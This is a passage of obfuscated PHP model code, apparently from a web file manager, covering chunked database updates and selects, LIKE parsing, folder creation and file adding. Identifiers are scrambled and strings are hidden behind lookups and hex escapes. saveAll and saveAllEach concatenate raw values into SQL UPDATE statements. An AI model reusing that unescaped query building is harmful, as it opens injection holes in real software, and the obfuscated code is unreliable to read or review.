$¾Ëèªî¥)) { if (!$¾Ëèªî¥[$Óè€ÏÄ]) { unset($¾Ëèªî¥[$Óè€ÏÄ]); } break; } if (isset($¾Ëèªî¥[$Óè€ÏÄ])) { array_unshift($óçÛå‚„, $¾Ëèªî¥[$Óè€ÏÄ]); } if ($ƒü©Ÿè’[397] == $òàà¬ûì[3]) { $¾Ëèªî¥[$Óè€ÏÄ] = call_user_func_array($¦àĞ¯¸ù, $óçÛå‚„); } else { $¾Ëèªî¥[$Óè€ÏÄ] = call_user_func_array(array(&$this, $¦àĞ¯¸ù), $óçÛå‚„); } break; case $ƒü©Ÿè’[347]: if (isset($¾Ëèªî¥[$Óè€ÏÄ]) && $¾Ëèªî¥[$Óè€ÏÄ]) { $¾Ëèªî¥[$Óè€ÏÄ] = call_user_func_array(array(&$this, $òàà¬ûì[1]), array($¾Ëèªî¥[$Óè€ÏÄ])); } break; case $ƒü©Ÿè’[350]: $¾Ëèªî¥[$Óè€ÏÄ] = $¾Ëèªî¥[$òàà¬ûì[1]]; break; case $ƒü©Ÿè’[370]: if (isset($¾Ëèªî¥[$Óè€ÏÄ]) && !is_string($¾Ëèªî¥[$Óè€ÏÄ])) { $¾Ëèªî¥[$Óè€ÏÄ] = json_encode_force($¾Ëèªî¥[$Óè€ÏÄ]); } break; case $ƒü©Ÿè’[399]: if ($¾Ëèªî¥[$Óè€ÏÄ] === $ƒü©Ÿè’[12]) { unset($¾Ëèªî¥[$Óè€ÏÄ]); } break; case $ƒü©Ÿè’[400]: $¾Ëèªî¥[$Óè€ÏÄ] = $òàà¬ûì[1]; default: break; } } if ($ôé¤±ƒ‰ == $ƒü©Ÿè’[431]) { $éØòÈï = strtolower($this->db->getDbType()); if (strpos($éØòÈï, $ƒü©Ÿè’[13]) !== 0) { return; } $¸’ÖåÀ¼ = $this->field(!0)->fields; $ÃŞ¡¬¾¼ = $¸’ÖåÀ¼[$ƒü©Ÿè’[329]]; if (isset($¸’ÖåÀ¼[$ƒü©Ÿè’[328]])) { unset($ÃŞ¡¬¾¼[$¸’ÖåÀ¼[$ƒü©Ÿè’[328]]]); } foreach ($ÃŞ¡¬¾¼ as $Ù…ƒÉÖ“ => $ôé¤±ƒ‰) { if (!isset($¾Ëèªî¥[$Ù…ƒÉÖ“])) { $¾Ëèªî¥[$Ù…ƒÉÖ“] = $ƒü©Ÿè’[12]; } } } } private function dataAfterFilter(&$Şı»ª†±) { $Û‚¢•Ş€ =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($this->dataAuto as $³öÔÂÄ) { $”àÈÕ = $³öÔÂÄ[0]; if (!isset($Şı»ª†±[$”àÈÕ])) { continue; } if (!in_array($Û‚¢•Ş€[433], explode($Û‚¢•Ş€[50], $³öÔÂÄ[2]))) { continue; } switch (trim($³öÔÂÄ[3])) { case $Û‚¢•Ş€[397]: case $Û‚¢•Ş€[398]: $èÁ½Ò¥ = isset($³öÔÂÄ[4]) ? (array) $³öÔÂÄ[4] : array(); array_unshift($èÁ½Ò¥, $Şı»ª†±[$”àÈÕ]); if (isset($³öÔÂÄ[4]) && $³öÔÂÄ[4] == $Û‚¢•Ş€[453]) { $èÁ½Ò¥ = array($Şı»ª†±[$”àÈÕ]); } if ($Û‚¢•Ş€[397] == $³öÔÂÄ[3]) { $Şı»ª†±[$”àÈÕ] = call_user_func_array($³öÔÂÄ[1], $èÁ½Ò¥); } else { $Şı»ª†±[$”àÈÕ] = call_user_func_array(array(&$this, $³öÔÂÄ[1]), $èÁ½Ò¥); } break; case $Û‚¢•Ş€[347]: if (isset($Şı»ª†±[$”àÈÕ]) && $Şı»ª†±[$”àÈÕ]) { $Şı»ª†±[$”àÈÕ] = call_user_func_array(array(&$this, $³öÔÂÄ[1]), array($Şı»ª†±[$”àÈÕ])); } break; case $Û‚¢•Ş€[350]: $Şı»ª†±[$”àÈÕ] = $Şı»ª†±[$³öÔÂÄ[1]]; break; case $Û‚¢•Ş€[370]: $ÌÃ¹ÌêÒ = $Şı»ª†±[$”àÈÕ]; $Şı»ª†±[$”àÈÕ] = json_decode($ÌÃ¹ÌêÒ, !0); if (is_null($Şı»ª†±[$”àÈÕ])) { $Şı»ª†±[$”àÈÕ] = $ÌÃ¹ÌêÒ; } break; case $Û‚¢•Ş€[399]: if ($Şı»ª†±[$”àÈÕ] === $Û‚¢•Ş€[12]) { unset($Şı»ª†±[$”àÈÕ]); } break; case $Û‚¢•Ş€[400]: $Şı»ª†±[$”àÈÕ] = $³öÔÂÄ[1]; break; default: break; } } } public function saveAll($ŠÈô€«) { $õ°íÄåÛ =& $_SERVER[ˆ¡¹µ‹Â]; $â•ÎÜøæ = $this->tablePrefix . $this->tableName; $ç»ÀÛ‚à = self::SQL_WHERE_IN_CHUNK; $ŠÈô€« = is_array($ŠÈô€«) ? $ŠÈô€« : array(); $£æıÈ†ç = $õ°íÄåÛ[454]; $†‡õ¹ğÔ = 0; $ñæÏ±Å = array(); $¯éí³ƒµ = count($ŠÈô€«); for ($­ ´’Ä“ = 0; $­ ´’Ä“ < $¯éí³ƒµ; $­ ´’Ä“++) { $èåÆ®üÒ = $ŠÈô€«[$­ ´’Ä“]; if (!is_array($èåÆ®üÒ) || count($èåÆ®üÒ) != 4) { continue; } $´ŞîÖıÃ = "\x55\x50\x44\101\x54\x45\40\x60{$â•ÎÜøæ}\140\40\123\105\x54\40{$èåÆ®üÒ[2]}\40\x3d\x20\103\x41\123\105\x20{$èåÆ®üÒ[0]}\x20\xa"; if ($†‡õ¹ğÔ == 0) { $£æıÈ†ç = $´ŞîÖıÃ; } $ñæÏ±Å[] = $õ°íÄåÛ[121] . $èåÆ®üÒ[1] . $õ°íÄåÛ[121]; $†‡õ¹ğÔ++; $£æıÈ†ç .= "\40\x57\x48\x45\x4e\40\47{$èåÆ®üÒ[1]}\47\40\x54\110\x45\116\40\x27{$èåÆ®üÒ[3]}\47\40\xa"; if ($†‡õ¹ğÔ == $ç»ÀÛ‚à || $­ ´’Ä“ == $¯éí³ƒµ - 1) { $”ÌÃğ¯ = implode($õ°íÄåÛ[50], $ñæÏ±Å); $£æıÈ†ç .= "\40\105\116\x44\40\40\127\x48\105\x52\105\40{$èåÆ®üÒ[0]}\x20\111\x4e\40\50{$”ÌÃğ¯}\x29\40"; $this->execute($£æıÈ†ç); $†‡õ¹ğÔ = 0; $£æıÈ†ç = $´ŞîÖıÃ; $this->chunkEventCheck(count($ñæÏ±Å)); $ñæÏ±Å = array(); } } $this->chunkEventSet(); } public function saveAllEach($µÖÇë•) { $–ôş‘ãœ =& $_SERVER[ˆ¡¹µ‹Â]; $¸Ş«ƒ†‰ = $this->tablePrefix . $this->tableName; foreach ($µÖÇë• as $˜›Ãı®é) { if (!is_array($˜›Ãı®é) || count($˜›Ãı®é) != 4) { continue; } $×º¼á“ = $˜›Ãı®é[0] . $–ôş‘ãœ[455] . $˜›Ãı®é[1] . $–ôş‘ãœ[121]; $‰üßÖ†œ = $˜›Ãı®é[2] . $–ôş‘ãœ[455] . $˜›Ãı®é[3] . $–ôş‘ãœ[121]; $õšá­¦ = "\165\160\144\x61\x74\x65\40{$¸Ş«ƒ†‰}\40\x73\x65\164\x20{$‰üßÖ†œ}\x20\x77\150\x65\162\145\x20{$×º¼á“}\x3b"; $this->execute($õšá­¦); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ªáÈ×º = false, $õ”¶˜ = false) { $this->_chunkEvent = $ªáÈ×º; $this->_chunkEventParam = $õ”¶˜; } private function chunkEventCheck($æ…Ã›ÙÖ) { if (!$this->_chunkEvent) { return; } $’£‰ĞøÃ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $’£‰ĞøÃ[$_SERVER[ˆ¡¹µ‹Â][456]] = $æ…Ã›ÙÖ; Hook::trigger($this->_chunkEvent, $’£‰ĞøÃ); } public function addAll($‡Ñ±‚ı, $Ù§Ã±½É = array(), $×©åĞ = false) { $Ë«åïµã =& $_SERVER[ˆ¡¹µ‹Â]; ignore_timeout(); $èÇ¸‹ïÎ = self::SQL_WHERE_IN_CHUNK; if (empty($‡Ñ±‚ı)) { $this->error = think_lang($Ë«åïµã[348]); return !1; } $Ù§Ã±½É = $this->_parseOptions($Ù§Ã±½É); foreach ($‡Ñ±‚ı as $³ìÑ¸é€ => $¦´²«›µ) { $‡Ñ±‚ı[$³ìÑ¸é€] = $this->_facade($¦´²«›µ); $this->_beforeInsert($‡Ñ±‚ı[$³ìÑ¸é€], $Ù§Ã±½É); } if (method_exists($this->db, $Ë«åïµã[349])) { for ($»–Ù—«í = 0; $»–Ù—«í < count($‡Ñ±‚ı); $»–Ù—«í += $èÇ¸‹ïÎ) { $ÂÒÙûÜ§ = array_slice($‡Ñ±‚ı, $»–Ù—«í, $èÇ¸‹ïÎ); if (!is_array($ÂÒÙûÜ§) || count($ÂÒÙûÜ§) == 0) { break; } $ãÑÁ–Á¨ = $this->db->insertAll($ÂÒÙûÜ§, $Ù§Ã±½É, $×©åĞ); $this->chunkEventCheck(count($ÂÒÙûÜ§)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($‡Ñ±‚ı as $³ìÑ¸é€ => $¦´²«›µ) { $ãÑÁ–Á¨ = $this->db->insert($¦´²«›µ, $Ù§Ã±½É, $×©åĞ); } $this->commit(); } if (!1 !== $ãÑÁ–Á¨) { $áç Şø× = $this->getLastInsID(); if ($áç Şø×) { return $áç Şø×; } } return $ãÑÁ–Á¨; } public function save($•ºìÃƒÖ = '', $ò«¼ï©³ = array()) { $ş­ÙŠÖí =& $_SERVER[ˆ¡¹µ‹Â]; $±•æÏÅ÷ = self::SQL_WHERE_IN_CHUNK; $ËŞ¶Ø® = $this->optionsValue(); $óïûÃÍ“ = $this->findWhereField($ËŞ¶Ø®); if (!$óïûÃÍ“) { return parent::save($•ºìÃƒÖ, $ò«¼ï©³); } $òÙç¥«Ñ = 0; $×‹Ê°¤ = $ËŞ¶Ø®[$ş­ÙŠÖí[352]][$óïûÃÍ“][1]; $×‹Ê°¤ = is_array($×‹Ê°¤) ? $×‹Ê°¤ : array(); $‚Ğ¹Õ£ = count($×‹Ê°¤); for ($åÍ¦ÖØˆ = 0; $åÍ¦ÖØˆ < $‚Ğ¹Õ£; $åÍ¦ÖØˆ += $±•æÏÅ÷) { $àí¼­ ² = array_slice($×‹Ê°¤, $åÍ¦ÖØˆ, $±•æÏÅ÷); if (!is_array($àí¼­ ²) || count($àí¼­ ²) == 0) { break; } $ËŞ¶Ø®[$ş­ÙŠÖí[352]][$óïûÃÍ“][1] = $àí¼­ ²; $this->optionsValue($ËŞ¶Ø®); $òÙç¥«Ñ += parent::save($•ºìÃƒÖ, $ò«¼ï©³); $this->chunkEventCheck(count($àí¼­ ²)); } $this->chunkEventSet(); return $òÙç¥«Ñ; } public function add($÷‰êø«‡ = '', $˜ÈœÔ³¨ = array(), $º‹ˆ·à³ = false) { if ($this->addTaskStatus && is_array($÷‰êø«‡)) { $this->addTaskData[] = $÷‰êø«‡; return; } return parent::add($÷‰êø«‡, $˜ÈœÔ³¨, $º‹ˆ·à³); } public function parseWhereLike($É¸ÜºĞÒ, $·êÑçÚ° = '', $¹‘±Éº— = false, &$É‚”—ñ¾ = false) { $¢¬Â½æ£ =& $_SERVER[ˆ¡¹µ‹Â]; $æùÏ÷Çµ = $GLOBALS[$¢¬Â½æ£[6]][$¢¬Â½æ£[457]]; if (!$æùÏ÷Çµ[$¢¬Â½æ£[458]]) { return $É¸ÜºĞÒ; } if (!is_array($É¸ÜºĞÒ)) { return $É¸ÜºĞÒ; } $»ÅÉÈö¿ = array(); $ñóÈ”âÛ = 0; foreach ($É¸ÜºĞÒ as $¹üÈ†ªÔ => $ÁÌöØõÄ) { if (is_array($ÁÌöØõÄ) && count($ÁÌöØõÄ) == 2 && $ÁÌöØõÄ[0] == $¢¬Â½æ£[459] && is_string($ÁÌöØõÄ[1]) && substr($ÁÌöØõÄ[1], 0, 1) == $¢¬Â½æ£[460] && substr($ÁÌöØõÄ[1], strlen($ÁÌöØõÄ[1]) - 1, 1) == $¢¬Â½æ£[460]) { $É‚”—ñ¾ = !0; $¶ŞÓ†á = is_string($¹üÈ†ªÔ) ? $¹üÈ†ªÔ : $·êÑçÚ°; $×÷û¯Î™ = substr($ÁÌöØõÄ[1], 1, strlen($ÁÌöØõÄ[1]) - 2); $×÷û¯Î™ = $this->db->escapeString($×÷û¯Î™); if (!strpos($¶ŞÓ†á, $¢¬Â½æ£[10])) { $¶ŞÓ†á = $¢¬Â½æ£[461] . $¶ŞÓ†á . $¢¬Â½æ£[461]; } $‚‘ßğé§ = $¢¬Â½æ£[220] . $×÷û¯Î™ . $¢¬Â½æ£[220]; $×÷û¯Î™ = str_replace(array($¢¬Â½æ£[10], $¢¬Â½æ£[462], $¢¬Â½æ£[11]), $¢¬Â½æ£[463], $×÷û¯Î™); if ($æùÏ÷Çµ[$¢¬Â½æ£[464]]) { $‚‘ßğé§ = $¢¬Â½æ£[465] . $×÷û¯Î™ . $¢¬Â½æ£[466]; if ($æùÏ÷Çµ[$¢¬Â½æ£[467]]) { $‚‘ßğé§ = $¢¬Â½æ£[466] . $×÷û¯Î™ . $¢¬Â½æ£[465]; } } $»ÅÉÈö¿[$ñóÈ”âÛ] = $¢¬Â½æ£[468] . $¶ŞÓ†á . $¢¬Â½æ£[469] . $‚‘ßğé§ . $¢¬Â½æ£[470]; $ñóÈ”âÛ++; continue; } if (is_array($ÁÌöØõÄ)) { $·êÑçÚ° = is_string($¹üÈ†ªÔ) ? $¹üÈ†ªÔ : $·êÑçÚ°; $ÁÌöØõÄ = $this->parseWhereLike($ÁÌöØõÄ, $·êÑçÚ°, !0, $É‚”—ñ¾); } if (is_numeric($¹üÈ†ªÔ)) { $»ÅÉÈö¿[$ñóÈ”âÛ] = $ÁÌöØõÄ; $ñóÈ”âÛ++; } else { $»ÅÉÈö¿[$¹üÈ†ªÔ] = $ÁÌöØõÄ; } } if ($É‚”—ñ¾ && !$¹‘±Éº—) { } return $»ÅÉÈö¿; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÇæÙ©ş = array()) { $¢¾×‰ƒ =& $_SERVER[ˆ¡¹µ‹Â]; $°¥ÙÍ²  = self::SQL_WHERE_IN_CHUNK; $àù¶ÏšÜ = $this->optionsValue(); $ÌÜßÃºê = $this->findWhereField($àù¶ÏšÜ); if (!$ÌÜßÃºê || isset($àù¶ÏšÜ[$¢¾×‰ƒ[368]]) || isset($àù¶ÏšÜ[$¢¾×‰ƒ[429]])) { return parent::select($ÇæÙ©ş); } $»Ÿêä = $àù¶ÏšÜ[$¢¾×‰ƒ[352]][$ÌÜßÃºê][1]; $»Ÿêä = is_array($»Ÿêä) ? $»Ÿêä : array(); $¢¼ß£¿× = null; for ($ª‰øşİş = 0; $ª‰øşİş < count($»Ÿêä); $ª‰øşİş += $°¥ÙÍ² ) { $ÎŸÊ£± = array_slice($»Ÿêä, $ª‰øşİş, $°¥ÙÍ² ); if (!is_array($ÎŸÊ£±) || count($ÎŸÊ£±) == 0) { break; } $àù¶ÏšÜ[$¢¾×‰ƒ[352]][$ÌÜßÃºê][1] = $ÎŸÊ£±; $this->optionsValue($àù¶ÏšÜ); $ôôôÏÃÊ = parent::select($ÇæÙ©ş); if (!$ôôôÏÃÊ) { continue; } $¢¼ß£¿× = is_array($¢¼ß£¿×) ? $¢¼ß£¿× : array(); $¢¼ß£¿× = array_merge($¢¼ß£¿×, $ôôôÏÃÊ); } return $¢¼ß£¿×; } public function delete($±ÉŞ²šÓ = array()) { $ô±É¯İ« =& $_SERVER[ˆ¡¹µ‹Â]; $¿ºşÊ°µ = self::SQL_WHERE_IN_CHUNK; $ŒŸ²’¹„ = $this->optionsValue(); $—‹¬»Éî = $this->findWhereField($ŒŸ²’¹„); if (!$—‹¬»Éî) { return parent::delete($±ÉŞ²šÓ); } $Öíü›Ãõ = 0; $¶»ÜÑ»ğ = $ŒŸ²’¹„[$ô±É¯İ«[352]][$—‹¬»Éî][1]; $¶»ÜÑ»ğ = is_array($¶»ÜÑ»ğ) ? $¶»ÜÑ»ğ : array(); for ($ŞÉ¿ÛàÓ = 0; $ŞÉ¿ÛàÓ < count($¶»ÜÑ»ğ); $ŞÉ¿ÛàÓ += $¿ºşÊ°µ) { $ø‘á›ßÊ = array_slice($¶»ÜÑ»ğ, $ŞÉ¿ÛàÓ, $¿ºşÊ°µ); if (!is_array($ø‘á›ßÊ) || count($ø‘á›ßÊ) == 0) { break; } $ŒŸ²’¹„[$ô±É¯İ«[352]][$—‹¬»Éî][1] = $ø‘á›ßÊ; $this->optionsValue($ŒŸ²’¹„); $Öíü›Ãõ += parent::delete($±ÉŞ²šÓ); } return $Öíü›Ãõ; } private function findWhereField($¼¸Õœ­Ô) { $üô£ßº• =& $_SERVER[ˆ¡¹µ‹Â]; $ËËÑŠ€ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¼¸Õœ­Ô) || !is_array($¼¸Õœ­Ô[$üô£ßº•[352]])) { return !1; } foreach ($¼¸Õœ­Ô[$üô£ßº•[352]] as $Ÿ¶û²½ => $ËÛ†íÍŠ) { if (is_array($ËÛ†íÍŠ) && isset($ËÛ†íÍŠ[0]) && is_string($ËÛ†íÍŠ[0]) && strtolower($ËÛ†íÍŠ[0]) == $üô£ßº•[7] && is_array($ËÛ†íÍŠ[1]) && count($ËÛ†íÍŠ[1]) > $ËËÑŠ€) { ignore_timeout(); return $Ÿ¶û²½; } } return !1; } public function setMasterDB($Ñ­ŒãçÑ = true) { think_config($_SERVER[ˆ¡¹µ‹Â][471], $Ñ­ŒãçÑ); } } goto A¢Ï„ìë»; D«Š¢´è‚Ø: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($•Ã’ø) { $ä§Á¿éÈ =& $_SERVER[ˆ¡¹µ‹Â]; $ ƒæ×í = Model($ä§Á¿éÈ[577])->where(array($ä§Á¿éÈ[1754] => $•Ã’ø))->find(); $°¡‡×Ğµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $•Ã’ø, $ ƒæ×í[$ä§Á¿éÈ[32]]); $this->userDesktopAdd($°¡‡×Ğµ); return $°¡‡×Ğµ; } public function userDesktopAdd($ËÄ×èÔó) { $ööÙ§Ù­ =& $_SERVER[ˆ¡¹µ‹Â]; $ªÇ¶»Ï = LNG($ööÙ§Ù­[2242]); $ÏÊÙÎÂí = $this->mkdir($ËÄ×èÔó, $ªÇ¶»Ï); $this->metaSet($ÏÊÙÎÂí, $ööÙ§Ù­[2243], $ööÙ§Ù­[91]); $this->metaSet($ËÄ×èÔó, $ööÙ§Ù­[2244], $ÏÊÙÎÂí); } public function userPathSafeAdd($……“ˆè§) { $¿¶Â•‘ì =& $_SERVER[ˆ¡¹µ‹Â]; $¿‚ƒ²ıá = Model($¿¶Â•‘ì[577])->getInfoFull($……“ˆè§); if (!$¿‚ƒ²ıá) { return !1; } if (_get($¿‚ƒ²ıá, $¿¶Â•‘ì[599])) { return $¿‚ƒ²ıá[$¿¶Â•‘ì[539]][$¿¶Â•‘ì[2245]]; } $íØè…Ã° = $this->_mkdirRoot(SourceModel::TYPE_USER, $……“ˆè§, $¿¶Â•‘ì[2246], $¿¶Â•‘ì[2247]); Model($¿¶Â•‘ì[577])->metaSet($……“ˆè§, $¿¶Â•‘ì[2245], $íØè…Ã°); $this->metaSet($íØè…Ã°, $¿¶Â•‘ì[2248], $……“ˆè§); return $íØè…Ã°; } public function userPathAppAdd($úÌÛÅ‚ã, $÷¶ãßÚî = '', $Â¶‚µÑ = '') { $Ó÷×ö™ =& $_SERVER[ˆ¡¹µ‹Â]; $ŒÖ°¿Ğ¹ = Model($Ó÷×ö™[577])->getInfoFull($úÌÛÅ‚ã); if (!$ŒÖ°¿Ğ¹) { return !1; } $øîÃ¸“ˆ = $ŒÖ°¿Ğ¹[$Ó÷×ö™[539]] ? $ŒÖ°¿Ğ¹[$Ó÷×ö™[539]] : array(); $øãü¼ÈÁ = $øîÃ¸“ˆ[$Ó÷×ö™[2249]]; if (!$øãü¼ÈÁ) { $øãü¼ÈÁ = $this->_mkdirRoot(SourceModel::TYPE_USER, $úÌÛÅ‚ã, $Ó÷×ö™[2250], $Ó÷×ö™[2251]); Model($Ó÷×ö™[577])->metaSet($úÌÛÅ‚ã, $Ó÷×ö™[2249], $øãü¼ÈÁ . $Ó÷×ö™[12]); $this->metaSet($øãü¼ÈÁ, $Ó÷×ö™[2249], $úÌÛÅ‚ã); } if (!$÷¶ãßÚî) { return $øãü¼ÈÁ; } $öâ¹˜ÃÜ = $øîÃ¸“ˆ[$Ó÷×ö™[2252] . $÷¶ãßÚî]; if (!$öâ¹˜ÃÜ) { $öâ¹˜ÃÜ = $this->mkdir($øãü¼ÈÁ, $÷¶ãßÚî); Model($Ó÷×ö™[577])->metaSet($úÌÛÅ‚ã, $Ó÷×ö™[2252] . $÷¶ãßÚî, $öâ¹˜ÃÜ); $this->metaSet($öâ¹˜ÃÜ, $Ó÷×ö™[2252] . $÷¶ãßÚî, $úÌÛÅ‚ã); } if (!$Â¶‚µÑ) { return $öâ¹˜ÃÜ; } $ó¯õèæ´ = $this->mkdir($öâ¹˜ÃÜ, $Â¶‚µÑ); return $ó¯õèæ´; } public function groupRootAdd($©ü¼á¹—) { $é¾ë‚˜… =& $_SERVER[ˆ¡¹µ‹Â]; $õŒı¦Ôò = Model($é¾ë‚˜…[585])->where(array($é¾ë‚˜…[2054] => $©ü¼á¹—))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $©ü¼á¹—, $õŒı¦Ôò[$é¾ë‚˜…[32]]); } public function systemRootPathAdd($¿ıìöŒƒ) { if ($¿ıìöŒƒ != $_SERVER[ˆ¡¹µ‹Â][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¿ıìöŒƒ); } public function userRootRemove($êÃû­–Ñ) { $¹¬¥­¢î = $this->targetSourceRoot(SourceModel::TYPE_USER, $êÃû­–Ñ, !0); foreach ($¹¬¥­¢î as $İÜÖß) { if (!$İÜÖß) { continue; } $this->remove($İÜÖß[$_SERVER[ˆ¡¹µ‹Â][193]], !1); } } public function groupRootRemove($ğó–îãÃ) { $ÎÇÍ½Ğ„ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ğó–îãÃ); if (!$ÎÇÍ½Ğ„) { return; } $this->remove($ÎÇÍ½Ğ„[$_SERVER[ˆ¡¹µ‹Â][193]], !1); } private function _mkdirRoot($İƒêœŸ, $ÍÌ¬»œİ, $ú¡ï„, $ä‘ë·ò = '') { $œêÊñ´ı =& $_SERVER[ˆ¡¹µ‹Â]; $Â¤‘ô¶ú = defined($œêÊñ´ı[2189]) ? USER_ID : 0; $¥î¥†€ô = array($œêÊñ´ı[477] => 0, $œêÊñ´ı[648] => $İƒêœŸ, $œêÊñ´ı[649] => $ÍÌ¬»œİ, $œêÊñ´ı[646] => 1, $œêÊñ´ı[650] => $Â¤‘ô¶ú, $œêÊñ´ı[651] => $Â¤‘ô¶ú, $œêÊñ´ı[647] => $ä‘ë·ò, $œêÊñ´ı[652] => $œêÊñ´ı[594], $œêÊñ´ı[504] => 0, $œêÊñ´ı[617] => 0, $œêÊñ´ı[542] => 0, $œêÊñ´ı[653] => $œêÊñ´ı[12]); if ($èø ’™Ö = $this->where($¥î¥†€ô)->find()) { return $èø ’™Ö[$œêÊñ´ı[193]]; } $Á·‘ÊÛÊ = "\115\x6f\x64\x65\x6c\x53\x6f\165\x72\143\145\56\x6d\x6b\x64\x69\162\x52\157\x6f\x74\56{$İƒêœŸ}\x2e{$ÍÌ¬»œİ}\x2e" . $ú¡ï„; CacheLock::lock($Á·‘ÊÛÊ); $¥î¥†€ô[$œêÊñ´ı[32]] = $ú¡ï„; $àŞœ‰Ò = $this->add($¥î¥†€ô); $€íÜğØ» = array($œêÊñ´ı[654] => short_id($àŞœ‰Ò)); $this->where(array($œêÊñ´ı[491] => $àŞœ‰Ò))->save($€íÜğØ»); CacheLock::unlock($Á·‘ÊÛÊ); return $àŞœ‰Ò; } private function targetSourceRoot($îìÄäÓ, $ŠÆƒ‰©¨, $ñ¢ĞËøË = false) { $•­Êœı’ =& $_SERVER[ˆ¡¹µ‹Â]; $£×¹èŞ€ = array($•­Êœı’[477] => 0, $•­Êœı’[648] => $îìÄäÓ, $•­Êœı’[649] => $ŠÆƒ‰©¨); if ($ñ¢ĞËøË) { $æüÏöÛç = $this->where($£×¹èŞ€)->select(); return $æüÏöÛç ? $æüÏöÛç : array(); } $ÏéçÙ¤• = $this->where($£×¹èŞ€)->find(); return $ÏéçÙ¤• ? $ÏéçÙ¤• : array(); } public function sourceRootGroup($ÖéÖì…) { $‘äÚ†õŸ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($ÖéÖì…)) { $ÖéÖì… = array($ÖéÖì…); } $¯»³©¼ı = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÖéÖì…, $‘äÚ†õŸ[220]); $´çÚÀèò = array($‘äÚ†õŸ[445] => $¯»³©¼ı, $‘äÚ†õŸ[442] => array($‘äÚ†õŸ[825] => count($ÖéÖì…))); $this->_listDataApply($´çÚÀèò[$‘äÚ†õŸ[445]]); $this->_listMake($´çÚÀèò); return array_to_keyvalue($´çÚÀèò[$‘äÚ†õŸ[85]], $‘äÚ†õŸ[569]); } public function mkfile($Ù‚ÏÚ—», $“ŸÁ® ´, $÷ÙÕ×¶ù = '', $è·ª®Ş = REPEAT_RENAME) { $œ¨í°´÷ =& $_SERVER[ˆ¡¹µ‹Â]; $à¿áÂ¼ = Model($œ¨í°´÷[674])->addFileByContent($÷ÙÕ×¶ù, $“ŸÁ® ´); return $this->_createFileCall($Ù‚ÏÚ—», $“ŸÁ® ´, $à¿áÂ¼, $è·ª®Ş, $œ¨í°´÷[1421]); } public function addFile($»×›‡Ö, $¯Ûä‹»Ù, $Çé¡Œ›§, $×Š¸ğ¸à = false, $ª˜‡Ã®¯ = REPEAT_RENAME) { $šæğ¾‰ = Model($_SERVER[ˆ¡¹µ‹Â][674])->addFile($¯Ûä‹»Ù, $Çé¡Œ›§, $×Š¸ğ¸à); return $this->_createFileCall($»×›‡Ö, $Çé¡Œ›§, $šæğ¾‰, $ª˜‡Ã®¯); } public function addFileByFileID($ùÌ•ù¿Ÿ, $“Ô˜„“ , $ñ¯åùí¾, $¿ ğæöø = REPEAT_RENAME) { $—†ÕŒÙ˜ =& $_SERVER[ˆ¡¹µ‹Â]; $Ğ˜”İ´È = Model($—†ÕŒÙ˜[674])->find($“Ô˜„“ ); Model($—†ÕŒÙ˜[674])->linkAdd($“Ô˜„“ ); return $this->_createFileCall($ùÌ•ù¿Ÿ, $ñ¯åùí¾, $Ğ˜”İ´È, $¿ ğæöø); } public function addFileByRemote($´½±¸Ÿî, $“˜öŞ¤ó, $»îÑšÆ, $”ßÁââÊ = array(), $©Šò±‘ = REPEAT_RENAME) { $Ù¬Ñ¤¥… = Model($_SERVER[ˆ¡¹µ‹Â][674])->addFileByRemote($“˜öŞ¤ó, $»îÑšÆ, $”ßÁââÊ); return $this->_createFileCall($´½±¸Ÿî, $»îÑšÆ, $Ù¬Ñ¤¥…, $©Šò±‘); } private function _createFileCall($Ï–§âİ¨, $Á—Ö…‘ñ, $É÷¬Ü‚ù, $Öü‰ñ¤, $«à–Ü’ = "\165\160\x6c\x6f\141\x64") { $ŞÍ§†Í =& $_SERVER[ˆ¡¹µ‹Â]; $åüšÄ = !1; $this->setMasterDB(); $this->lockWriteStart($Ï–§âİ¨, $Á—Ö…‘ñ); $ú•ğóåä = $this->fileNameExist($Ï–§âİ¨, $Á—Ö…‘ñ); $Î²²çç‚ = $this->_createFile($Ï–§âİ¨, $Á—Ö…‘ñ, $É÷¬Ü‚ù, $Öü‰ñ¤, $åüšÄ); if (!$åüšÄ) { Model($ŞÍ§†Í[544])->remove($É÷¬Ü‚ù[$ŞÍ§†Í[541]]); } if ($åüšÄ && $Î²²çç‚ && $Î²²çç‚ != $ú•ğóåä) { Model($ŞÍ§†Í[2215])->eventCreate($Î²²çç‚, $«à–Ü’); } $this->lockWriteEnd($Ï–§âİ¨, $Á—Ö…‘ñ); return $Î²²çç‚; } public function mkdir($õ›˜¬, $¦İ‡¹ò, $ëÑŸ‹—» = REPEAT_SKIP) { $Ù¾è”‚ß =& $_SERVER[ˆ¡¹µ‹Â]; $this->setMasterDB(); $çÇøÁ„Ù = $this->sourceInfo($õ›˜¬); if (!$çÇøÁ„Ù) { return !1; } $this->lockWriteStart($õ›˜¬, $¦İ‡¹ò); if ($ëÑŸ‹—» !== !1) { $—Æ’ŒµÆ = $this->fileNameExist($õ›˜¬, $¦İ‡¹ò); if ($—Æ’ŒµÆ && $ëÑŸ‹—» != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($õ›˜¬, $¦İ‡¹ò); return $—Æ’ŒµÆ; } $¦İ‡¹ò = $this->fileNameAuto($õ›˜¬, $¦İ‡¹ò, $ëÑŸ‹—»); } $›ĞÂ–˜Ğ = array($Ù¾è”‚ß[646] => 1, $Ù¾è”‚ß[494] => $¦İ‡¹ò, $Ù¾è”‚ß[647] => $Ù¾è”‚ß[12], $Ù¾è”‚ß[542] => 0, $Ù¾è”‚ß[617] => 0); $Ş´¬Ø¯ = $this->_addSource($›ĞÂ–˜Ğ, $çÇøÁ„Ù); Model($Ù¾è”‚ß[2215])->eventCreate($Ş´¬Ø¯, $Ù¾è”‚ß[1422]); 